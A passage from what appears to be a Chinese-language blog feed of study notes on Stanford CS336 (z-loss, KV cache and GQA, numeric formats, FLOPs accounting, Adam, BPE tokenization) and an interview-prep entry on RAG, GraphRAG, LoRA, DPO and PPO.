1（one-hot），其他的变成0。导致梯度消失。Softcapping 保证了 Softmax输出的概率分布保留了一定的熵（不确定性），让梯度能持续回传。</li></ol><h3 id="output-softmax-stability-the-z-loss">Output Softmax Stability:The “z-loss”</h3><p>为了解决输出层 Softmax 的数值溢出问题（Logits 过大导致配分函数 <spanclass="math inline">\(Z(x)\)</span> 爆炸），PaLM 引入了<strong>z-loss</strong> trick。</p><p><strong>原理</strong>: 在总 Loss 中增加一项辅助惩罚，鼓励配分函数<span class="math inline">\(\log Z\)</span> 接近 0，此时<spanclass="math inline">\(Z\)</span> 接近 1。 <span class="math display">\[Z(x) = \sum_{i} e^{z_i} \\L_{\text{total}} = L_{\text{original}} + 10^{-4} \cdot \log^2 Z\]</span> <strong>应用</strong>: 该技巧主要用于 TPU/GPU 低精度(<code>bfloat16</code>) 训练时的数值稳定性，已被 Baichuan 2, DCLM, OLMo2 等模型广泛采用。</p><h2 id="attention-efficiency">Attention Efficiency</h2><p>随着模型上下文窗口的增大，推理时的显存占用和带宽成为了主要瓶颈。虽然Transformer 的核心架构变动不大，但 Attention Heads的设计为了效率做出了显著调整。</p><h3 id="推理瓶颈incremental-generation-kv-cache">推理瓶颈：IncrementalGeneration &amp; KV Cache</h3><p>在文本生成阶段，模型是逐步生成 (Step-by-step) 的，无法并行。</p><p><strong>KV Cache</strong>: 为了避免每次生成新 Token时重复计算历史所有 Token 的 Attention，我们必须缓存之前所有 Token 的 Key和 Value 矩阵。</p><p><strong>显存压力</strong>: 随着序列变长，KV Cache的体积会线性增长，甚至超过模型权重的显存占用。这限制了最大 Batch Size和上下文长度。</p><h3 id="优化方案gqa-mqa">优化方案：GQA / MQA</h3><p>为了解决 KV Cache 过大的问题，现代模型通过减少 Key/Value Head的数量来降低推理成本。</p><ul><li><strong>MQA (Multi-Query Attention)</strong>:<ul><li><strong>机制</strong>: 所有 Query Heads <strong>共享同一个</strong>Key Head 和 Value Head。</li><li><strong>优势</strong>: 极致的显存节省和推理加速。</li></ul></li><li><strong>GQA (Grouped Query Attention)</strong>:<ul><li><strong>机制</strong>: 将 Query Heads 分组，每组共享一个 KVHead。例如 LLaMA 2/3。</li><li><strong>定位</strong>:这是一个折中方案，平衡了推理效率和模型性能。</li></ul></li></ul><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194519072.png" style="zoom:40%;" /></p><h3 id="其他-attention-变体">其他 Attention 变体</h3><p><strong>Sparse / Sliding Window Attention</strong>: 如 Mistral 和GPT-4，通过限制 Attention 只看最近的窗口或稀疏点，将复杂度从 <spanclass="math inline">\(O(N^2)\)</span> 降低，以处理超长文本。</p><p><img src="https://raw.githubusercontent.com/XLOverflow/blog-image/main/image-20251216194550997.png" alt="image-20251216194550997" style="zoom:35%;" /></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Transformer </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> Architectures </tag>
            
            <tag> Hyperparameters </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec2 PyTorch &amp; Resource accounting</title>
      <link href="/zh/2025/12/15/CS336/CS336-Lec2-PyTorch-Resource-accounting/"/>
      <url>/zh/2025/12/15/CS336/CS336-Lec2-PyTorch-Resource-accounting/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-2-pytorch-resource-accounting">Lec 2: PyTorch &amp; Resourceaccounting</h1><h2 id="数值格式float-pointing-formats">数值格式（Float PointingFormats）</h2><p>深入计算之前，我们需要知道我们在计算的是什么。这其中涉及到很多的对<strong>运算效率</strong>和<strong>数值精度</strong>的Tradeoffs。</p><p>任何浮点数在计算机中都由3部分的bit位组成：符号位（Sign）、指数位（Exponent）和尾数位（Fraction）。其计算公式为<span class="math display">\[(-1)^S \times 1.M \times 2^{E-Bias}\]</span></p><ul><li>S决定正负</li><li>M决定精度，小数点后的部分，位数越多，数字越密</li><li>E决定动态的范围，位数越多，表示的范围越大</li><li>Bias偏置，固定常数，让指数可以是负数，平衡正负范围</li></ul><h3 id="为什么不全用fp32">为什么不全用FP32</h3><p>标准的FP32（Single Precision）拥有1个符号、8个指数、23位位数</p><ul><li>优点：精度高，范围大，训练stable</li><li>缺点：慢，占用显存大</li><li>现代大模型的训练中，FP32主要用于优化器更新时的备份，而非核心计算</li></ul><h3 id="fp16和bf16">FP16和BF16</h3><p>为了寻求更快的计算效率，业界主要是16-bit的格式，这里主要是由FP16和BF16组成。</p><ol type="1"><li><p>FP16（Half Precision）：</p><ul><li><p>结构：5位指数+10位尾数</p></li><li><p>缺陷：指数位太少，意味着<strong>动态范围很小</strong>，如果数值太小直接会Underflow，比如<spanclass="math inline">\(1e^-8\)</span>就会有这种情况</p></li></ul></li><li><p>BF16（Brain Float 16）：</p><ul><li>结构：8位指数+7位尾数</li><li>核心优势：指数位和FP32一样，意味着拥有和<strong>FP32同样的动态范围</strong>，精度稍微差点。</li><li>结论：深度学习对”范围”敏感，对“精度”不敏感，神经网络本身就是模糊近似，因此BF16是<strong>目前大模型训练的标准格式</strong>。</li></ul></li></ol><hr /><h2 id="算力的度量flops">算力的度量：FLOPs</h2><h3 id="矩阵乘法matmul">矩阵乘法（MatMul）</h3><p>深度学习的核心是矩阵乘法<span class="math inline">\(Y = X \timesW\)</span>，计算代价的公式如下： <span class="math display">\[FLOPs = 2 \cdot B \cdot D \cdot K\]</span></p><ul><li>B: Batch Size</li><li>D: Input Dimension</li><li>K: Output Dimension</li><li>Origin of 2: 计算机底层的一次FMA（FusedMultiply-Add）指令通常是2个FLOPs，1次乘法和1次加法</li></ul><h3 id="训练成本定律126">训练成本定律：1:2:6</h3><p>这是本节课最重要的Rule of Thumb，为什么训练比推理贵那么多?</p><p>整个训练过程分为<strong>前向和反向传播</strong>，分别计算代价</p><ul><li>Forward Pass: 计算<span class="math inline">\(H =XW\)</span>。消耗1个单位的算力</li><li>Backward Pass: 需要计算2份梯度，第一个是权重梯度<spanclass="math inline">\(dW\)</span>，输入梯度<spanclass="math inline">\(dX\)</span>。前者用于更新参数，后者用于传播给上一层。</li></ul><p>对于一个包含P个参数的模型，是用N个Token进行训练，总浮点数的运算量约为：<span class="math display">\[C \approx 6 \cdot N \cdot P\]</span>前向2个FLOPs，反向4个FLOPs，所以总共是6个，由此得到了上面的比率。</p><p>我们在这里所讨论的参数量（ParameterCount），永远指的是<strong>物理上独立存在(不包括共享参数)、需要被优化器更新的变量总数</strong>。</p><p>对于共享参数而言，其的确<strong>能够减少参数量</strong>，但计算层面其实<strong>计算量FLOPs并没有减少</strong>，因为你还是需要穿过这些层的网络结构执行对应的计算。</p><p>之所以在这里使用了<spanclass="math inline">\(\approx\)</span>是因为我们忽略了两样东西：</p><ul><li><strong>Embedding层和Softmax层</strong>：这两层的参数量P并不少，词表很大，但是并不完全遵循2P的计算逻辑，不过相对于中间几十层的TranformerBlock，误差可以接受。</li><li><strong>Attention的<spanclass="math inline">\(N^2\)</span>计算</strong>：我们此前只假设算力和参数量P有关，但是Attention己之力，Query和Key的相乘计算量是<spanclass="math inline">\(N^2\)</span>，这部分的计算不消耗参数，但只要N（序列长度）远小于P，这一项就能忽略不计。</li></ul><p>这里可能会有一个疑问Attention为什么是<spanclass="math inline">\(N^2\)</span>？</p><p>其实这里更像是时间复杂度的简化，精确的计算公式是：</p><p><span class="math display">\[12N^2LH = \underbrace{L}_{\text{层数}} \times\underbrace{(4N^2H)}_{\text{前向传播}} \times\underbrace{3}_{\text{训练系数}}\]</span></p><ul><li>L是Transformer的层数，模型是由L个完全一样的Block堆叠起来的</li><li>前向传播的部分是QKV矩阵的乘法运算</li><li>训练系数遵循前向传播1，反向传播2，总共是3</li></ul><p>我们在比较的是：<strong>“巨大的参数量 P”</strong> vs<strong>“序列长度N”</strong>。在目前的标准模型配置下，前者比后者大太多了。</p><h3 id="硬件h100与tensor-cores">硬件：H100与Tensor Cores</h3><p>GPU中有通用核心和专用核心：</p><ul><li>CUDA Cores: <strong>通用灵活但慢</strong>，处理FP32/FP64</li><li>Tensor Cores: <strong>专为矩阵乘法设计</strong>，H100的TensorCore每个时钟周期能执行规模<span class="math inline">\(4 \times4\)</span>矩阵运算，支持<strong>混合精度</strong>，输入可以是FP16/BF16，内部累加用FP32，兼顾速度和数值的稳定性。</li></ul><p>稀疏性（Sparity）：</p><p>NVIDIA宣传H100拥有1979TFLOPs的FP16算力。但真相是这是开启（StructuredSparsity(2:4)）后的理论值，要求每4个元素必须有2个是0才能跳过0计算。</p><p>现实中，大部分训练都是Dense训练，所以<strong>算力直接减半</strong>。</p><h2 id="工程实践代码和维度管理">工程实践：代码和维度管理</h2><h3 id="维度地狱-dimensionality-hell">维度地狱 (DimensionalityHell)</h3><p>在 Transformer 代码中，手动处理维度（如 <code>view</code>,<code>transpose</code>）极易出错且难以调试：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x = x.view(B, N, H, D).permute(<span class="number">0</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">3</span>) <span class="comment"># 这里的 0,2,1,3 到底是谁？</span></span><br></pre></td></tr></table></figure><h3 id="einops库">Einops库</h3><p>课程强烈推荐使用 <code>einops</code>库，它让维度变换变得“声明式”和“自文档化”：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> einops <span class="keyword">import</span> rearrange</span><br><span class="line"></span><br><span class="line"><span class="comment"># 清晰的语义：把 Head 维度拆出来，并放到序列长度前面</span></span><br><span class="line">q = rearrange(x, <span class="string">&#x27;b s (h d) -&gt; b h s d&#x27;</span>, h=<span class="number">8</span>)</span><br></pre></td></tr></table></figure><p><strong>原则</strong>：代码不仅是给机器跑的，更是给人看的。显式优于隐式。</p><hr /><h2 id="optimizer-优化器">Optimizer 优化器</h2><h3 id="adamw来源">AdamW来源</h3><p>我们现在主流的优化器是AdamW，但他是如何进化来的？</p><ul><li><strong>SGD</strong>：朴素的梯度下降，根据直接的梯度来走</li><li><strong>Momentum</strong>：加上“惯性”，物理上的动量，用于在陡坡上累计的动量，冲过平坦的区域，因为平坦的地方可能是鞍点，局部最优，这时候普通的SGD可能直接停下来了</li><li><strong>RMSProp</strong>：加上自适应的步长（二阶动量），<strong>路陡步子小，路平步子大</strong>。</li><li><strong>Adam</strong>：Momentum + RMSProp。集成前两者优点。</li></ul><h3 id="什么是动量">什么是动量</h3><p>在深度学习的优化器中，主要分为一阶和二阶动量：</p><ul><li><strong>一阶动量</strong>（Momentum）是梯度的平均值，保留正负号，作用是往前冲还是往后退。考虑基于历史速度和现在加速度（梯度）得出来的新速度。</li><li><strong>二阶动量</strong>（SecondMoment）是梯度平方的平均值，因为有平方，所以符号消失了，证明它只在乎大小幅度而不在乎方向，衡量的是梯度到底多陡。</li></ul><p><strong>RMSProp</strong>（Root Mean Square Propagation）: <spanclass="math display">\[参数更新量 = \frac{\text{学习率}}{\sqrt{\text{二阶动量}}} \times\text{梯度}\]</span>他可以做到如果在梯度很大的情况下利用分母的二阶动量让步长变小（路陡步子小），小的时候又可以放大（路平步子大），解决了<strong>峡谷的震荡</strong>问题以及鞍点的收敛问题。</p><h3 id="adam-adaptive-moment-estimation">Adam (Adaptive MomentEstimation)</h3><p><span class="math display">\[\begin{aligned}\text{1. 计算梯度:} &amp; \quad g_t = \nabla_\theta J(\theta_{t-1}) \\\text{2. 更新一阶动量 (Momentum):} &amp; \quad m_t = \beta_1 \cdotm_{t-1} + (1 - \beta_1) \cdot g_t \\\text{3. 更新二阶动量 (RMSProp):} &amp; \quad v_t = \beta_2 \cdotv_{t-1} + (1 - \beta_2) \cdot g_t^2 \\\text{4. 偏差修正 (Bias Correction):} &amp; \quad \hat{m}_t =\frac{m_t}{1 - \beta_1^t}, \quad \hat{v}_t = \frac{v_t}{1 - \beta_2^t}\\\text{5. 参数更新 (Final Update):} &amp; \quad \theta_t = \theta_{t-1} -\eta \cdot \frac{\hat{m}_t}{\sqrt{\hat{v}_t} + \epsilon}\end{aligned}\]</span></p><p><span class="math display">\[\theta_t = \theta_{t-1} - \eta \cdot \frac{\overbrace{\left(\frac{\beta_1 m_{t-1} + (1-\beta_1)g_t}{1-\beta_1^t}\right)}^{\text{修正后的一阶动量 (方向 +惯性)}}}{\underbrace{\sqrt{\frac{\beta_2 v_{t-1} +(1-\beta_2)g_t^2}{1-\beta_2^t}}}_{\text{修正后的二阶动量 (自适应步长)}}+ \epsilon}\]</span>简单分析一下，分子是惯性，分母是阻力，或者说叫归一化。其实这个公式的本质就是代码Momentum的惯性去冲，但是同时有RMSProp的自适应刹车。</p><h2 id="关键总结-takeaways">关键总结 (Takeaways)</h2><ol type="1"><li><strong>算力去哪了？</strong> 绝大部分算力（&gt;95%）都在<strong>Forward</strong> 和 <strong>Backward</strong>的矩阵乘法上。</li><li><strong>显存去哪了？</strong><ul><li><strong>静态</strong>：模型参数 (Weights) + 优化器状态 (OptimizerStates)。</li><li><strong>动态</strong>：中间激活值 (Activations)。Batch Size越大，Context Length 越长，激活值显存占用越恐怖。</li></ul></li><li><strong>瓶颈在哪？</strong><ul><li>矩阵乘法层通常是 <strong>Compute Bound</strong> (卡在算力上)。</li><li>LayerNorm, Softmax, CrossEntropy 通常是 <strong>MemoryBound</strong> (卡在显存带宽上)。</li></ul></li></ol>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
            <tag> PyTorch </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CS336-Lec1 Tokenization</title>
      <link href="/zh/2025/12/14/CS336/CS336-Lec1-Tokenization/"/>
      <url>/zh/2025/12/14/CS336/CS336-Lec1-Tokenization/</url>
      
        <content type="html"><![CDATA[<h1 id="lec-1-tokenization">Lec 1: Tokenization</h1><p>语言模型的本质是对token序列做建模</p><p><span class="math display">\[p(x_1, x_2, \dots, x_T)\]</span> 其中<spanclass="math inline">\(x_T\)</span>代表的是一个整数tokenid，我们还需要有一个<strong>抽象接口</strong>做双向映射，这个接口就是Tokenizer</p><ul><li><code>encode(str) -&gt; List[int]</code></li><li><code>decode(List[int]) -&gt; str</code></li></ul><p><strong>Tradeoffs</strong>:</p><ul><li>Volcabulary size is big: 序列短，但有可能稀有 token学不到、embedding 巨大。</li><li>Volcabulary size is small: 泛化好，参数省，但是序列长导致Transformerattention <span class="math inline">\(O(T^2)\)</span> 很贵</li></ul><p><strong>Q&amp;A:</strong></p><ol type="1"><li><p><strong>为什么词表大 ≠ “更好学”，反而有“稀有 token学不到”的问题？</strong></p><p>如果词表里包含很罕见的整词一个token：`“supercalifragilisticexpialidocious”，它在训练里可能只出现 1次或几次，那它对应的embedding/输出权重基本没训练到，这个时候如果用更小的词表，这个长词会被拆成多个更常见的子词/字符组合，能学的更好。</p></li><li><p><strong>为什么词表大会导致embedding整体变大？</strong></p><p>这个主要是因为输出的logits的形状大小是 <spanclass="math inline">\(\text{Vocab_size} \times\text{Hidden_size}\)</span>,词表变大，这一块的参数量翻倍，代价更大</p></li></ol><h2 id="compression-ratio">Compression Ratio</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">num_bytes = <span class="built_in">len</span>(string.encode(<span class="string">&quot;utf-8&quot;</span>))</span><br><span class="line">indices = tokenizer(string)</span><br><span class="line">num_tokens = <span class="built_in">len</span>(indices)</span><br></pre></td></tr></table></figure><p><span class="math display">\[\text{compression_ratio} = \frac{\text{num_bytes}}{\text{num_tokens}}\]</span>该值越大表明每个token能够表示更多的字节，序列<strong>更短</strong>，信息的压缩程度越高。</p><h2 id="character-tokenizer">Character Tokenizer</h2><p>核心思想是把字符串拆成Unicode字符，每个字符用 <code>ord()</code>变成整数。<code>decode</code> 用 <code>chr()</code> 拼回去。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">encode: <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">ord</span>, string))</span><br><span class="line">decode: <span class="string">&quot;&quot;</span>.join(<span class="built_in">map</span>(<span class="built_in">chr</span>, indices))</span><br></pre></td></tr></table></figure><p>优点是<strong>简单、可逆</strong>，缺点是<strong>词表非常大</strong>（Unicode大约 150K+），稀有字符非常多，<strong>浪费词表的容量</strong>。</p><h2 id="byte-tokenizer">Byte Tokenizer</h2><p>核心思想就是字符串转 UTF-8 bytes，每个 byte 是 0~255。词表固定<strong>256</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">string_bytes = string.encode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">indices = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>, string_bytes))</span><br><span class="line">decode: <span class="built_in">bytes</span>(indices).decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p><strong>Compression_ratio恒等于1</strong></p><p>优点是<strong>词表很小</strong>，且完全可逆，但是<strong>序列太长</strong>，对于注意力机制来说是灾难。</p><h2 id="word-tokenizer">Word Tokenizer</h2><p>核心思想是用正则把文本切成segments，然后给每个 segment 分配一个id</p><p>优点是序列会更短，缺点是词表的大小不固定，还有可能会爆炸，新词需要<code>UNK</code>（会影响 perplexity &amp; 泛化体验）</p><h2 id="bpe-tokenizer">BPE Tokenizer</h2><p>在“byte 的小词表”和“word 的短序列”之间找平衡：</p><ul><li>常见片段合并成一个 token（序列变短）</li><li>罕见片段仍可退化成多个 byte</li></ul><p>执行步骤，从byte开始，重复做num_merges次：</p><ol type="1"><li>统计当前序列里所有相邻 pair 的出现次数</li><li>找出现最多的 pair</li><li>把它合并成新 token（新 id = 256 + i）</li><li>更新 vocab：<code>vocab[new] = vocab[a] + vocab[b]</code></li><li>在序列里把所有该 pair 替换掉</li></ol><p>Encode/Decode</p><ul><li>encode：从 bytes 开始，按 merges 顺序把能合的 pair 合掉</li><li>decode：把每个 token id 映射回 bytes，再拼起来 decode utf-8</li></ul><p>优点是<strong>词表可控</strong>（256 +num_merges），<strong>序列变短</strong>，缺点是<strong>朴素的encode会非常慢</strong></p><h2 id="reference">Reference</h2><p><ahref="https://stanford-cs336.github.io/spring2025-lectures/?trace=var/traces/lecture_01.json">LectureMaterial</a></p>]]></content>
      
      
      <categories>
          
          <category> Stanford CS336 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> AI </tag>
            
            <tag> Tokenization </tag>
            
            <tag> LLM </tag>
            
            <tag> CS336 </tag>
            
            <tag> Stanford </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>淘天ai agent面经</title>
      <link href="/zh/2025/12/14/Personal/%E6%B7%98%E5%A4%A9ai-agent%E9%9D%A2%E7%BB%8F/"/>
      <url>/zh/2025/12/14/Personal/%E6%B7%98%E5%A4%A9ai-agent%E9%9D%A2%E7%BB%8F/</url>
      
        <content type="html"><![CDATA[<h1 id="淘天ai-agent面经">淘天ai agent面经</h1><h2id="介绍rag流程介绍对编码模型的了解原理优缺点如何评估编码模型的能力">1，介绍RAG流程；介绍对编码模型的了解、原理、优缺点；如何评估编码模型的能力</h2><p>RAG (Retrieval-Augmented Generation)核心流程分为：<strong>数据准备</strong>（清洗、分块、向量化、存储）、<strong>检索</strong>（相似度搜索）、<strong>增强</strong>（将上下文注入Prompt）和<strong>生成</strong>（LLM 输出）。</p><h3 id="编码模型原理与优缺点">编码模型原理与优缺点</h3><p>编码模型通常基于 <strong>BERT/RoBERTa</strong> 等 Encoder-only架构。通过双向注意力机制将文本映射到高维向量空间。</p><ul><li><strong>原理</strong>：利用对比学习（ContrastiveLearning），让语义相近的文本在向量空间中距离更近（CosineSimilarity）。</li><li><strong>优点</strong>：计算效率高，适合大规模语义搜索。</li><li><strong>缺点</strong>：受限于上下文窗口长度（通常 512-812字符）；无法理解极其复杂的长程逻辑。</li></ul><h3 id="评估指标">评估指标</h3><ul><li><strong>MTEB (Massive Text EmbeddingBenchmark)</strong>：目前公认的权威排行榜。</li><li><strong>检索准确率</strong>：<span class="math inline">\(HitRate@K\)</span>（前 K 个结果是否包含正确答案）和 <strong>MRR</strong>(Mean Reciprocal Rank)。</li></ul><h2id="rag有哪些分类多模态rag有哪些实现框架伪多模态rag和多模态rag分别怎么实现有什么区别clip可以用于哪一类多模态rag为什么">2，RAG有哪些分类；多模态RAG有哪些实现框架；伪多模态RAG和多模态RAG分别怎么实现，有什么区别；CLIP可以用于哪一类多模态RAG，为什么</h2><h3 id="naive-rag-简单检索">Naive RAG (简单检索)</h3><p>这是最基础的 <strong>Index -&gt; Retrieve -&gt; Augment -&gt;Generation</strong> 线性流程。</p><ul><li><strong>做法</strong>：把文档切块（Chunking），存进向量数据库。用户提问时，把问题转成向量去库里找最像的Top-K 个片段，塞给 LLM 完事。</li><li><strong>缺陷</strong>：<ul><li><strong>检索慢/准度低</strong>：向量匹配可能只搜到了关键词相似，但语义不相关的片段。</li><li><strong>上下文断裂</strong>：切块可能正好把一句重要的话切断了，导致信息不完整。</li></ul></li></ul><h3 id="advanced-rag-预处理-后处理">Advanced RAG (预处理 + 后处理)</h3><p>针对简单检索的痛点，在检索的前后两端加了大量的优化策略：</p><ul><li><strong>预处理 (Pre-Retrieval)</strong>：<ul><li><strong>查询重写 (Query Rewriting)</strong>：用户问得模糊，先让 LLM把问题改写得更清晰，或者生成多个变体（Multi-Query）。</li><li><strong>假设性回答 (HyDE)</strong>：先让 LLM瞎猜一个答案，用这个“假答案”去搜，往往比直接用“问题”搜更准。</li></ul></li><li><strong>后处理 (Post-Retrieval)</strong>：<ul><li><strong>重排序 (Rerank)</strong>：向量搜索搜出 100个，用更精密的模型（Cross-Encoder）精挑细选出最相关的 5 个。</li><li><strong>上下文压缩</strong>：把搜到的长篇大论精简，只留下关键信息，防止LLM “迷失在中部”。</li></ul></li></ul><h3 id="modular-rag-模块化编排">Modular RAG (模块化编排)</h3><p>这是目前的尖端形态，它不再是线性的，而是<strong>原子化、插件化</strong>的。</p><ul><li><strong>核心逻辑</strong>：将 RAG拆成不同的功能模块，根据任务需求灵活组合。</li><li><strong>新模块示例</strong>：<ul><li><strong>Search 模块</strong>：不只搜向量库，还可以去搜 Google或企业知识图谱。</li><li><strong>Memory 模块</strong>：记住用户之前的对话习惯。</li><li><strong>Rewrite/Route模块</strong>：根据问题类型自动决定是去查数据库还是直接生成。</li></ul></li><li><strong>特点</strong>：支持<strong>迭代</strong>和<strong>循环</strong>。比如搜了一次发现不够，它会自动触发“再次搜索”模块，直到信息足够为止。</li></ul><table><colgroup><col style="width: 14%" /><col style="width: 18%" /><col style="width: 32%" /><col style="width: 34%" /></colgroup><thead><tr class="header"><th><strong>维度</strong></th><th><strong>Naive RAG</strong></th><th><strong>Advanced RAG</strong></th><th><strong>Modular RAG</strong></th></tr></thead><tbody><tr class="odd"><td><strong>流程</strong></td><td>线性 (Straight)</td><td>线性 + 前后增强</td><td>模块化、非线性 (如循环、分支)</td></tr><tr class="even"><td><strong>核心技术</strong></td><td>向量检索</td><td>重排序 (Rerank)、Query 转换</td><td>智能体路由 (Router)、多源融合</td></tr><tr class="odd"><td><strong>解决痛点</strong></td><td>实现了从无到有</td><td>解决了检索噪音和语义对齐</td><td>解决了复杂任务和长流程问题</td></tr></tbody></table><h3 id="多模态-rag-实现">多模态 RAG 实现</h3><ul><li><strong>实现框架</strong>：LlamaIndex, LangChain (Multi-modal),Unstructured.io。</li><li><strong>伪多模态 RAG</strong>：通过<strong>Captioning</strong>。将图像/视频转为文字描述，存入传统文本向量库。<ul><li><strong>区别</strong>：伪多模态丢失了视觉细节；真多模态直接在统一向量空间（MultimodalEmbedding）匹配。</li></ul></li><li><strong>CLIP 的作用</strong>：属于<strong>真多模态 RAG</strong>的基础。它通过图文对训练，实现了图像和文本在同一特征空间的表征，适合“以文搜图”或“以图搜图”。</li></ul><h2id="rag怎么评估rag评估体系中最重要的是什么">3，RAG怎么评估，RAG评估体系中最重要的是什么</h2><p>评估体系中最核心的是 <strong>RAG Triad (三元组)</strong>：</p><ol type="1"><li><strong>Faithfulness (忠实度)</strong>：答案是否来源于检索到的Context。</li><li><strong>Answer Relevance (答案相关性)</strong>：答案是否解决了Query。</li><li><strong>Context Precision(检索精度)</strong>：检索到的信息是否包含正确答案。</li></ol><h2id="传统rag有什么痛点介绍graphraggraphrag的难点是什么graphrag如何应对增量场景">4，传统RAG有什么痛点；介绍GraphRAG，GraphRAG的难点是什么；GraphRAG如何应对增量场景</h2><h3 id="传统-rag-痛点">传统 RAG 痛点</h3><ul><li><strong>全局性理解差</strong>：难以回答“这篇文档的主旨是什么”这类宏观问题。</li><li><strong>长程关联弱</strong>：无法连接跨文档、跨段落的隐性实体关系。</li></ul><h3 id="graphrag">GraphRAG</h3><ul><li><strong>难点</strong>：图谱构建成本极高（LLM抽取实体关系耗时）；Schema 设计复杂。</li><li><strong>增量场景</strong>：通过 <strong>GraphConsolidation</strong>。新实体进入时，利用 LLM 进行实体消歧（EntityResolution），合并重复节点，更新已有的聚类摘要。</li></ul><h2id="介绍微调负责的工作大模型微调最重要的是什么">5，介绍微调负责的工作；大模型微调最重要的是什么</h2><p><strong>负责工作</strong>：领域知识注入、格式对齐（InstructionFollowing）、风格迁移。</p><p><strong>最重要的一点</strong>：<strong>数据质量（DataQuality）</strong>。正如 LIMA 论文所述：<em>Less Is More forAlignment</em>，1000 条高质量数据远胜 10 万条脏数据。</p><h2id="后训练有哪些方式微调有哪些方式分别是怎么做的lora原理及参数量">6，后训练有哪些方式；微调有哪些方式，分别是怎么做的；LoRA原理及参数量</h2><h3 id="后训练方式">后训练方式</h3><table><colgroup><col style="width: 13%" /><col style="width: 10%" /><col style="width: 25%" /><col style="width: 27%" /><col style="width: 22%" /></colgroup><thead><tr class="header"><th><strong>阶段 / 方式</strong></th><th><strong>核心目标</strong></th><th><strong>核心做法</strong></th><th><strong>优缺点分析</strong></th><th><strong>适用场景</strong></th></tr></thead><tbody><tr class="odd"><td><strong>1. 指令微调 (SFT)</strong></td><td>让模型学会对话与遵循指令</td><td>使用 <span class="math inline">\((Prompt, Response)\)</span>数据对进行监督训练。</td><td><strong>优点</strong>：见效快，是对话能力的基石。<strong>缺点</strong>：难以解决价值观偏好问题。</td><td>基础对话能力构建、特定格式对齐（如 JSON）。</td></tr><tr class="even"><td><strong>2. 持续预训练 (CPT)</strong></td><td>注入领域知识</td><td>在特定领域的纯文本上进行 Next Token Prediction 训练。</td><td><strong>优点</strong>：大幅提升行业常识。<strong>缺点</strong>：不改变交互模式，算力开销较大。</td><td>医疗、法律、金融等垂直领域专家模型构建。</td></tr><tr class="odd"><td><strong>3. 强化学习 (RLHF - PPO)</strong></td><td>极致的人类偏好对齐</td><td>训练奖励模型（RM），通过 PPO 算法更新策略。</td><td><strong>优点</strong>：上限极高，模型更“聪明”且安全。<strong>缺点</strong>：流程极复杂，需要三个模型同时运行，训练极不稳定。</td><td>顶级闭源/开源模型（如 GPT-4, Llama 3）的最终打磨。</td></tr><tr class="even"><td><strong>4. 直接偏好优化 (DPO)</strong></td><td>高效的偏好对齐</td><td>抛弃奖励模型，直接在 (最好回答, 最差回答) 对上计算 Loss。</td><td><strong>优点</strong>：简单、稳定，显存占用低，目前最主流。<strong>缺点</strong>：对数据分布较敏感。</td><td>绝大多数企业级对话模型和微调项目。</td></tr><tr class="odd"><td><strong>5. 模块化微调 (LoRA / PEFT)</strong></td><td>低成本适配任务</td><td>冻结原参数，只训练旁路的低秩矩阵（Rank Decomposition）。</td><td><strong>优点</strong>：参数量极小（&lt;1%），显存要求极低。<strong>缺点</strong>：性能上限略低于全量微调。</td><td>算力受限情况下的下游任务适配、多任务切换。</td></tr><tr class="even"><td><strong>6. 混合优化 (ORPO)</strong></td><td>一步到位对齐</td><td>将 SFT 和对齐合并，不需要参考模型。</td><td><strong>优点</strong>：流程极简，计算效率高。<strong>缺点</strong>：属于较新技术，社区沉淀相对较少。</td><td>追求极致训练效率的轻量化项目。</td></tr></tbody></table><h3 id="微调方式">微调方式</h3><ul><li><strong>FullFine-tuning</strong>：全参微调，效果好但算力开销极大。</li><li><strong>PEFT (参数高效微调)</strong>：如 LoRA, P-Tuning,Adapter。</li></ul><h3 id="lora-原理">LoRA 原理</h3><p>在预训练权重的旁边并联两个低秩矩阵 <spanclass="math inline">\(A\)</span> 和 <spanclass="math inline">\(B\)</span>。 <span class="math display">\[W_{new} = W_{base} + \Delta W = W_{base} + A \times B\]</span> <strong>参数量</strong>：极小，通常不到原模型的 1%。计算公式为<span class="math inline">\(2 \times r \times d_{model}\)</span>（<spanclass="math inline">\(r\)</span> 为秩）。</p><h2 id="介绍dpodpo与ppo的区别">7，介绍DPO；DPO与PPO的区别</h2><h3 id="ppo-原理">PPO 原理</h3><p><strong>PPO (Reinforcement Learning from HumanFeedback)</strong>：需要训练 <strong>RewardModel</strong>，通过策略梯度更新。流程复杂，训练极不稳定。</p><h3 id="为什么-ppo-训练不稳定">为什么 PPO 训练不稳定？</h3><ul><li><strong>信度分配（Credit 